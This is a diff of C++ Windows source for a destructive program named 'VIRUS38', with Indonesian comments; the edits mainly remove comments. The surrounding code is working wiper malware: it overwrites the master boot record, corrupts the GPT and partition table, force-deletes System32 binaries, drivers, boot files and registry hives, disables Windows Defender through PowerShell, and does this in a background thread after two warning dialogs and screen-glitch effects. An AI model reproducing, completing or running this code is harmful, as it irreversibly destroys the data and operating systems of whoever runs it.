@@ -26,7 +26,6 @@
 #include <virtdisk.h>
 #include <wincrypt.h>
 #include <gdiplus.h>
-#include <intrin.h>
 
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
@@ -34,7 +33,7 @@
 
 using namespace Gdiplus;
 
-// Konfigurasi efek visual yang lebih intens
+// Konfigurasi efek visual
 const int REFRESH_RATE = 1;
 const int MAX_GLITCH_INTENSITY = 25000;
 const int GLITCH_LINES = 5000;
@@ -96,15 +95,15 @@ void OverwriteMBR() {
         BYTE maliciousMBR[mbrSize] = {0};
         
         // Isi MBR dengan kode berbahaya
-        memset(maliciousMBR, 0x90, mbrSize); // NOP sled
+        memset(maliciousMBR, 0x90, mbrSize);
         
         // Pesan yang akan muncul saat boot
         const char* bootMessage = "VIRUS38 ACTIVATED - SYSTEM COMPROMISED";
         memcpy(maliciousMBR + 0x100, bootMessage, strlen(bootMessage));
         
         // Tambahkan instruksi assembly sederhana untuk efek visual
-        maliciousMBR[0] = 0xEB; // JMP rel8
-        maliciousMBR[1] = 0xFE; // Infinite loop
+        maliciousMBR[0] = 0xEB;
+        maliciousMBR[1] = 0xFE;
         
         DWORD bytesWritten;
         WriteFile(hDevice, maliciousMBR, mbrSize, &bytesWritten, NULL);
@@ -118,8 +117,7 @@ void CorruptGPT() {
                                 NULL, OPEN_EXISTING, 0, NULL);
     
     if (hDevice != INVALID_HANDLE_VALUE) {
-        // Tulis data acak ke area GPT
-        const int gptAreaSize = 16384; // 16KB
+        const int gptAreaSize = 16384;
         BYTE* randomData = new BYTE[gptAreaSize];
         
         for (int i = 0; i < gptAreaSize; i++) {
@@ -127,7 +125,7 @@ void CorruptGPT() {
         }
         
         DWORD bytesWritten;
-        SetFilePointer(hDevice, 512, NULL, FILE_BEGIN); // Lewati MBR
+        SetFilePointer(hDevice, 512, NULL, FILE_BEGIN);
         WriteFile(hDevice, randomData, gptAreaSize, &bytesWritten, NULL);
         
         delete[] randomData;
@@ -141,19 +139,17 @@ void DestroyPartitionTable() {
                                 NULL, OPEN_EXISTING, 0, NULL);
     
     if (hDevice != INVALID_HANDLE_VALUE) {
-        // Tulis nol ke seluruh tabel partisi
         const int partitionTableSize = 1024;
         BYTE zeroData[partitionTableSize] = {0};
         
         DWORD bytesWritten;
-        SetFilePointer(hDevice, 446, NULL, FILE_BEGIN); // Lokasi tabel partisi MBR
+        SetFilePointer(hDevice, 446, NULL, FILE_BEGIN);
         WriteFile(hDevice, zeroData, partitionTableSize, &bytesWritten, NULL);
         CloseHandle(hDevice);
     }
 }
 
 void CreateBootMessage() {
-    // Buat file teks di direktori system32 yang akan terlihat setelah reboot
     WCHAR systemPath[MAX_PATH];
     GetSystemDirectoryW(systemPath, MAX_PATH);
     
@@ -431,7 +427,7 @@ void ApplyTextCorruption() {
             } else if (rand() % 3 == 0) {
                 c = L'�';
             } else if (rand() % 5 == 0) {
-                c = static_cast<wchar_t>(0x3040 + rand() % 96); // Hiragana
+                c = static_cast<wchar_t>(0x3040 + rand() % 96);
             } else {
                 c = static_cast<wchar_t>(0x20 + rand() % 95);
             }
@@ -661,7 +657,6 @@ void ApplyGlitchEffect() {
     
     DWORD cTime = GetTickCount();
     
-    // Perhitungan intensitas berdasarkan waktu
     int timeIntensity = 1 + static_cast<int>((cTime - startTime) / 2000);
     intensityLevel = std::min(40, timeIntensity);
     
@@ -672,7 +667,6 @@ void ApplyGlitchEffect() {
         lastEffectTime = cTime;
     }
     
-    // Glitch garis horizontal intens
     int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 25000);
     for (int i = 0; i < effectiveLines; ++i) {
         int y = rand() % screenHeight;
@@ -725,7 +719,6 @@ void ApplyGlitchEffect() {
         }
     }
     
-    // Distorsi blok ekstrim
     int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 5000);
     for (int i = 0; i < effectiveBlocks; ++i) {
         int blockWidth = std::min(200 + rand() % (800 * intensityLevel), screenWidth);
@@ -931,7 +924,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     return DefWindowProc(hwnd, msg, wParam, lParam);
 }
 
-// Fungsi untuk menjalankan perintah shell
 void ExecuteCommand(const char* command) {
     STARTUPINFOA si = { sizeof(STARTUPINFOA) };
     PROCESS_INFORMATION pi;
@@ -940,24 +932,19 @@ void ExecuteCommand(const char* command) {
     CloseHandle(pi.hThread);
 }
 
-// Fungsi untuk merusak sistem file
 void CorruptSystemFiles() {
-    // Hapus file sistem penting
     system("del /f /q /s C:\\Windows\\System32\\*.dll");
     system("del /f /q /s C:\\Windows\\System32\\*.exe");
     system("del /f /q /s C:\\Windows\\System32\\drivers\\*.sys");
     
-    // Hapus file boot
     system("del /f /q /s C:\\bootmgr");
     system("del /f /q /s C:\\boot\\bcd");
     
-    // Hapus file penting lainnya
     system("del /f /q /s C:\\Windows\\System32\\config\\SAM");
     system("del /f /q /s C:\\Windows\\System32\\config\\SYSTEM");
     system("del /f /q /s C:\\Windows\\System32\\config\\SOFTWARE");
 }
 
-// Fungsi untuk mematikan Windows Defender
 void DisableWindowsDefender() {
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
@@ -969,24 +956,16 @@ void DisableWindowsDefender() {
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableScriptScanning $true\"");
 }
 
-// Fungsi untuk mematikan sistem
 void ShutdownSystem() {
-    // Matikan sistem dengan paksa
     ExecuteCommand("shutdown /r /f /t 0");
-    
-    // Hancurkan sistem file
     CorruptSystemFiles();
-    
-    // Matikan Windows Defender
     DisableWindowsDefender();
 }
 
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
-    // Inisialisasi GDI+
     GdiplusStartupInput gdiplusStartupInput;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    // Peringatan pertama
     if (MessageBoxW(NULL, 
         L"VIRUS38 - PERINGATAN!\n\n"
         L"Program ini adalah program berbahaya yang dapat merusak sistem komputer Anda.\n"
@@ -1004,7 +983,6 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         return 0;
     }
 
-    // Peringatan kedua seperti MEMZ
     if (MessageBoxW(NULL, 
         L"PERINGATAN TERAKHIR!\n\n"
         L"Program ini akan menyebabkan kerusakan permanen pada sistem Anda.\n"
@@ -1024,23 +1002,17 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     
     FreeConsole();
     
-    // Jalankan fungsi perusakan di thread terpisah
     std::thread([]() {
-        // Tunggu sebentar sebelum mulai merusak
         Sleep(10000);
         
-        // Rusak MBR dan GPT
         OverwriteMBR();
         CorruptGPT();
         DestroyPartitionTable();
         
-        // Buat pesan boot
         CreateBootMessage();
         
-        // Tunggu lagi sebelum merusak lebih lanjut
         Sleep(20000);
         
-        // Rusak sistem file dan matikan sistem
         CorruptSystemFiles();
         ShutdownSystem();
     }).detach();
